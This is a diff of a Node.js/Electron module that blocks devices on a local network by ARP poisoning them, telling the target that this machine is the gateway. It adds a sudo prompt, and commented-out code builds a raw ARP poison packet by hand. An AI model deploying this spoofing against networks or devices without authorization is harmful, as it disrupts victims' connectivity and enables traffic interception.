@@ -1,38 +1,54 @@
 // const pcap = require('pcap');
 const arp = require('arpjs');
 var network = require('network');
+var sudo = require('sudo-prompt');
 
-const blockHostDevice = (event, arg) => {
-  console.log("blockHostDevice arg",arg);
-  console.log(`\nsudo setcap cap_net_raw,cap_net_admin=eip ${process.argv[0]}`);
+const blockHostDevice = async (event, arg) => {
+  // console.log('blockHostDevice arg', arg);
+  // console.log(`\nsudo setcap cap_net_raw,cap_net_admin=eip ${process.argv[0]}`);
+  console.log('before the auth');
 
-  let { hostIP, ournetworkOption } = arg;
+  var options = {
+    name: 'Electron',
+    icns: '/Applications/Electron.app/Contents/Resources/Electron.icns', // (optional)
+  };
 
- 
-  ournetworkOption = JSON.parse(ournetworkOption);
+  sudo.exec(
+    `echo setcap cap_net_raw,cap_net_admin=eip ${process.argv[0]}`,
+    options,
+    function (error, stdout, stderr) {
+      if (error) console.log(error);
+      blockHost();
+    }
+  );
 
-  console.log('ournetworkOption', ournetworkOption);
-  console.log("hostIP",hostIP)
+  const blockHost = () => {
+    let { hostIP, ournetworkOption } = arg; // get the info from react
 
-  let netinterface = ournetworkOption.split('-')[0];
-  console.log('netinterface', netinterface);
-  let targetip = hostIP;
-  console.log('targetip', targetip);
+    ournetworkOption = JSON.parse(ournetworkOption);
+    let netinterface = ournetworkOption.split('-')[0]; // this is the network interface
+    console.log('netinterface', netinterface);
+    let targetip = hostIP;
 
-  network.get_gateway_ip(function (err, gatewayip) {
-    console.log(err || gatewayip);
-    // arp.setInterface(nietinterface);
-    // arp.poison(targetip, gatewayip); // tell target I am gateway
-    arp.setInterface("wlan0");
-    console.log('poison',targetip,gatewayip)
-    arp.poison("192.168.0.11", "192.168.0.1"); // tell target I am gateway
-    console.log('fnished the thing');
-    event.reply('BLOCK-HOST-REPLY', 'we ahve received the data');
+    console.log('hostIP', hostIP);
+    console.log('targetip', targetip);
 
-  });
+    network.get_gateway_ip(function (err, gatewayip) {
+      if (err) console.log(err || gatewayip);
+      arp.setInterface(netinterface);
+      arp.poison(targetip, gatewayip); // tell target I am gateway
+      event.reply('BLOCK-HOST-REPLY', true); // send back to electron that it has been blocked
+    });
+  };
+
+};
 
 
-  // the old way:
+
+module.exports = blockHostDevice;
+
+
+ // the old way:
   /*
     let { netinterface, ourmac, ourip, gatewayip, targetip } = arg;
     //    wlan0 aa:bb:cc:00:00 192.168.0.2 192.168.0.1,
@@ -41,18 +57,12 @@ const blockHostDevice = (event, arg) => {
     ourip = JSON.parse(ourip);
     gatewayip = JSON.parse(gatewayip);
     targetip  = JSON.parse(targetip);
-
     var packet = poison_packet(ourmac, ourip, gatewayip, targetip))
     pcap_session = pcap.createSession(netinterface, 'arp');
     pcap_session.inject(packet);
   */
-};
-
-module.exports = blockHostDevice;
 
 /* Old way
-
-
 // Build arpspoof poison packet
 //                          ip we tell and convince -------.
 //                          ip we want to control --v      v
@@ -97,5 +107,4 @@ function poison_packet(ourmac, ourip, victimip, tellip) {
     tellip[0], tellip[1], tellip[2], tellip[3],
   ]);
 }
-
 */
